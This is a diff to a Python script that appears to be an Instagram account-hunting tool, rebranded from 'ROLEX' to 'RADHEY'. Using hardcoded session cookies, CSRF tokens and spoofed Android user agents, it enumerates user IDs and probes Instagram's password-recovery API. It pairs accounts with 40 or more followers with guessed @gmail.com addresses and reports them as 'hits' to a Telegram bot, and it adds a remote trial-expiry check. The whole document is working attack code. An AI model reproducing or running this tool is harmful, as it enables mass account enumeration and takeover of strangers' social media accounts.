@@ -48,7 +48,7 @@ goodig = 0
 b = random.randint(5,208)
 bo = f'\x1b[38;5;{b}m'
 import time
-
+import time
 import os,random
 try:from cfonts import render
 except:os.system('pip install python-cfonts');from cfonts import render
@@ -60,10 +60,31 @@ def slow_print(text,delay=.05):
 	print()
 def show_banner():A=render('ROLEX',font='block',colors=[random_color()],align='left',space=False);print(A)
 show_banner()
-print_slowly(' \x1b[41m\x1b[1;37m</> #𝐑𝐎𝐋𝐄𝐗 𝐇𝐄𝐑𝐄\x1b[0m\x1b[1;97m ')
+print_slowly(' \x1b[41m\x1b[1;37m</> 𝐂𝐑𝐀𝐗𝐘 𝐀𝐍𝐃 #𝐑𝐀𝐃𝐇𝐄𝐘 \x1b[0m\x1b[1;97m ')
 time.sleep(1.5)
 import webbrowser 
-webbrowser.open("https://t.me/+AHRiogoodig
+import time
+def check_expiry():
+    expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiryuser.txt"
+    try:
+        response = requests.get(expiry_url, timeout=5)
+        response.raise_for_status()
+        expiry_str = response.text.strip()
+        expiry_datetime = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+        if datetime.now() > expiry_datetime:
+            print(f"{Fore.RED}THIS TOOL TRIAL IS ENDED NOW DM @boloradhey FOR RENEWAL")
+            exit(1)
+        else:
+            print(f"{Fore.GREEN}WELCOME TO THE TOOL !! 🦚")
+    except requests.exceptions.RequestException as e:
+        print(f"⚠Failed to check expiry (using offline fallback): {e}")
+check_expiry()
+Token = input('BOT TOKEN : ')
+print("\x1b[1;39m-" * 60)
+ID = input('CHAT ID : ')
+
+def pppp():
+    global badinsta,hits,bademail,goodig
     b = random.randint(5,208)
     bo = f'\x1b[38;5;{b}m'
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -135,7 +156,7 @@ def rest(user):
     'X-IG-App-ID': '567067343352427',
     'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
     'Accept-Language': 'en-GB, en-US',
-     'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
+     'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'Accept-Encoding': 'gzip, deflate',
     'Host': 'i.instagram.com',
@@ -144,7 +165,7 @@ def rest(user):
     'Content-Length': '356',
 }
     data = {
-    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
     'ig_sig_key_version': '4',
   }
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
@@ -176,16 +197,20 @@ def date(Id):
             return 2018
         elif 10016232396 <= uid < 27238602159:
             return 2019
-        elif 8507940634 <= uid < 21254029834:
-            return 2019
         elif 27238602160 <= uid < 43464475395:
             return 2020
         elif 43464475396 <= uid < 50289297647:
             return 2021
         elif 50289297648 <= uid < 57464707082:
             return 2022
+        elif 57464707083 <= uid < 65000000000:
+            return 2023
+        elif 65000000001 <= uid < 80000000000:
+            return 2024
+        elif 80000000001 <= uid < 100000000000:
+            return 2025
         else:
-            return "2023-2025"
+            return "2025+"
     except Exception:
         return 'unknown'
 
@@ -217,7 +242,7 @@ def InfoAcc(username, gg):
 
     total += 1
     ss = f'''
-#𝐑𝐎𝐋𝐄𝐗 𝐒𝐄𝐍𝐓 𝐘𝐎𝐔 𝐀 𝐇𝐈𝐓    
+#𝐑𝐀𝐃𝐇𝐄𝐘 𝐒𝐄𝐍𝐓 𝐘𝐎𝐔 𝐀 𝐇𝐈𝐓    
 ✦ ──── ✦ ──── ✦ ──── ✦ 
 🌀 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 » @{username}  
 📧 𝐄𝐦𝐚𝐢𝐥 » {username}@gmail.com  
@@ -312,12 +337,12 @@ def check_on(email):
     uui = str(uuid.uuid4())
     headers = {
         'User-Agent': ua,
-        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
+        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     }
     data = {
         'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
-            '_csrftoken': 'ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
+            '_csrftoken': '0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
             'adid': uui,
             'guid': uui,
             'device_id': device_id,
@@ -354,7 +379,7 @@ def uuu():
 
     domain='@gmail.com'
     bbk = 2369359762
-    Ido = 57464707082
+    Ido = 100000000000
     while True:      
       rnd=str(random.randint(150, 999))
       user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
@@ -386,7 +411,7 @@ def uuu():
       infoinsta[username] = response.json().get('data', {}).get('user', {})
       rr = infoinsta.get(username,{})
       fows = rr.get('follower_count', None)
-      if fows >= 30:
+      if fows >= 40:
 	      email = username + domain
 	      check_on(email)
           
